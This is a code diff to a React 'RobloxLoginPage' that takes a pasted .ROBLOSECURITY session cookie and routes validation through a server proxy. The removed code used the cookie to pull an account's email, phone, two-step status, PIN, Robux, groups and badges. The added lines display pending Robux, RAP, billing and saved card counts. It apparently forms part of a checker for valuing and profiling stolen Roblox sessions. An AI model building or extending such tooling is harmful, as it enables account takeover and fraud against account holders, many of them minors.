@@ -27,86 +27,24 @@ export default function RobloxLoginPage() {
     addLog(`Cookie received (${cookie.length} chars)`)
 
     try {
-      addLog("Validating cookie with Roblox API...")
-      const headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
-      const cookies = { ".ROBLOSECURITY": cookie.trim() }
+      addLog("Validating via server proxy...")
+      const res = await fetch("/api/roblox", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookie: cookie.trim() }),
+      })
 
-      const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers, credentials: "omit" })
-      if (authRes.status !== 200) {
-        setError("Invalid or expired cookie (IP locked or bad cookie)")
-        addLog("ERROR: Cookie validation failed")
+      if (!res.ok) {
+        const err = await res.json().catch(() => ({ error: "Unknown error" }))
+        setError(err.error || "Invalid cookie")
+        addLog(`ERROR: ${err.error || "Validation failed"}`)
         setLoading(false)
         return
       }
 
-      const auth = await authRes.json()
-      const uid = auth.id
-      const username = auth.name
-
-      // Fetch all data in parallel
-      addLog(`Authenticated as ${username} (ID: ${uid})`)
-
-      const [
-        robuxRes, premRes, avatarRes, userRes, friendsRes,
-        followersRes, followingsRes, emailRes, phoneRes, twoFaRes,
-        pinRes, countryRes, groupsRes, badgesRes, wearingRes, gamesRes
-      ] = await Promise.allSettled([
-        fetch(`https://economy.roblox.com/v1/users/${uid}/currency`, { headers, credentials: "omit" }),
-        fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers, credentials: "omit" }),
-        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png`, { headers }),
-        fetch(`https://users.roblox.com/v1/users/${uid}`, { headers }),
-        fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
-        fetch(`https://friends.roblox.com/v1/users/${uid}/followers/count`, { headers }),
-        fetch(`https://friends.roblox.com/v1/users/${uid}/followings/count`, { headers }),
-        fetch("https://accountsettings.roblox.com/v1/email", { headers, credentials: "omit" }),
-        fetch("https://accountsettings.roblox.com/v1/phone", { headers, credentials: "omit" }),
-        fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers, credentials: "omit" }),
-        fetch("https://auth.roblox.com/v1/account/pin", { headers, credentials: "omit" }),
-        fetch("https://users.roblox.com/v1/users/authenticated/country-code", { headers, credentials: "omit" }),
-        fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
-        fetch(`https://accountinformation.roblox.com/v1/users/${uid}/roblox-badges`, { headers }),
-        fetch(`https://avatar.roblox.com/v1/users/${uid}/currently-wearing`, { headers }),
-        fetch(`https://games.roblox.com/v2/users/${uid}/games?accessFilter=Public&limit=50`, { headers }),
-      ])
-
-      const data: any = { username, uid, displayName: auth.displayName }
-
-      const get = (r: PromiseSettledResult<Response>) =>
-        r.status === "fulfilled" && r.value.ok ? r.value.json().catch(() => ({})) : Promise.resolve({})
-
-      const [robux, prem, avatar, user, friends, followers, followings, email, phone, twoFa, pin, country, groups, badges, wearing, games] =
-        await Promise.all([get(robuxRes), get(premRes), get(avatarRes), get(userRes), get(friendsRes), get(followersRes), get(followingsRes), get(emailRes), get(phoneRes), get(twoFaRes), get(pinRes), get(countryRes), get(groupsRes), get(badgesRes), get(wearingRes), get(gamesRes)])
-
-      data.robux = robux.robux || 0
-      data.premium = prem === true || (prem?.premiumFeatureId !== undefined)
-      data.avatarUrl = avatar.data?.[0]?.imageUrl || null
-      data.created = user.created?.split("T")[0] || null
-      data.about = (user.description || "").substring(0, 50) || null
-      data.friends = friends.count || 0
-      data.followers = followers.count || 0
-      data.followings = followings.count || 0
-      data.email = email.emailAddress || null
-      data.emailVerified = email.verified || false
-      data.phone = phone.phone || null
-      data.phoneVerified = phone.isVerified || false
-      data.twoFa = twoFa.is2faEnabled || false
-      data.pin = pin.isEnabled || false
-      data.country = country.countryCode || null
-      data.groups = groups.data?.length || 0
-      data.groupsOwned = groups.data?.filter((g: any) => g.role?.rank === 255).length || 0
-      data.badges = Array.isArray(badges) ? badges.length : 0
-      data.wearing = wearing.assetIds?.length || 0
-      data.games = games.data?.length || 0
-      data.verified = user.hasVerifiedBadge || false
-
-      // Calculate account age
-      if (data.created) {
-        const diff = Date.now() - new Date(data.created).getTime()
-        data.ageDays = Math.floor(diff / 86400000)
-      }
-
+      const data = await res.json()
       setUserData(data)
-      addLog(`SUCCESS: ${username} | Robux: ${data.robux} | Friends: ${data.friends}`)
+      addLog(`SUCCESS: ${data.username || "?"} | Robux: R$${data.robux?.toLocaleString() || 0}`)
     } catch {
       setError("Network error. Check your connection.")
       addLog("ERROR: Network failure")
@@ -153,6 +91,10 @@ export default function RobloxLoginPage() {
               { label: "DISPLAY NAME", value: userData?.displayName || "—", icon: "📛" },
               { label: "USER ID", value: userData?.uid || "—", icon: "🆔" },
               { label: "ROBUX", value: userData ? `R$ ${userData.robux?.toLocaleString() || 0}` : "—", icon: "💰" },
+              { label: "PENDING", value: userData ? `R$ ${userData.pendingRobux?.toLocaleString() || 0}` : "—", icon: "⏳" },
+              { label: "RAP", value: userData ? `R$ ${userData.rap?.toLocaleString() || 0}` : "—", icon: "📊" },
+              { label: "BILLING", value: userData?.billing || "—", icon: "💳" },
+              { label: "CARDS", value: userData?.cards?.toString() || "—", icon: "💳" },
               { label: "PREMIUM", value: userData ? (userData.premium ? "✅ Yes" : "❌ No") : "—", icon: "⭐" },
               { label: "EMAIL", value: userData?.email ? `${userData.email} ${userData.emailVerified ? "✅" : ""}` : "—", icon: "📧" },
               { label: "PHONE", value: userData?.phone ? `${userData.phone} ${userData.phoneVerified ? "✅" : ""}` : "—", icon: "📱" },
